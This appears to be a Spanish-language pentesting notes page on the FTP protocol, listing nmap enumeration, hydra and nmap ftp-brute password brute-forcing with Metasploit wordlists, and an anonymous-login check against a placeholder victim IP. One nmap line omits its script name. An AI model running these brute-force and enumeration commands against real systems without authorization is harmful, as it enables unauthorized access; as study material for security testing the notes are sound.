---
title: 'Protocolo FTP'
description: 'Notas sobre cómo explotarlo'
pubDate: 2023-12-18
author: 'Nicolas Riquelme'
tags: ["Hacking", "Windows", "FTP", "sharing", "discover", "mount"]
tableOfContents:
  minHeadingLevel: 2
  maxHeadingLevel: 3
---
# FTP
FTP son las siglas para el protocolo de transferencia de archivos (File Transfer Protocol). Es un protocolo de red que permite la transferencia de archivos entre dos sistemas conectados a una red TCP por el puerto 21. El protocolo FTP tiene una versión más segura (SFTP) que encripta el tráfico.

## Enumeración
### Enumeración básica
```bash 
ping {ip víctima}		 							# para ver si esta activa la red
nmap {ip víctima} 									# para ver los puertos abiertos
nmap -p21 --script  {ip víctima} 		# para ver la información del protocolo FTP
```
### Enumeración de usuarios y contraseñas
En la carpeta de Kali /usr/share/metasploit-framework/data/wordlists encontraremos los diccionarios "common_users.txt" y "unix_passwords.txt"

```bash
hydra -L {path diccionario de usuarios} -P {path a diccionario de passwords} {ip víctima} ftp -o hydra.txt 	# creará un archivo hydra.txt con los resultados obtenidos

nmap -p21 {ip víctima} --script ftp-brute --script-args userdb={archivo con los usuarios}
```
## Comando FTP
```bash
ftp {ip víctima} 					# nos pedirá el usuario y la contraseña. Los comandos que se pueden usar son una mezcla entre POSIX y DOS. Estos son algunos de los que se pueden usar una vez logueados:
	ls								# listar el contenido del directorio
	bye								# cerrar la conexión
	get {archivo}					# descargará el archivo seleccionado
	put {path a archivo remoto}		# subirá el archivo local al servidor
```
### Login anónimo
```bash
nmap {ip víctima} -p21 --script ftp-anon		# nos indicará si está configuirado para permitir conexiones anónimas y el contenido de las unidades que lo permitan

ftp {ip víctima}
	anonymous
	
```
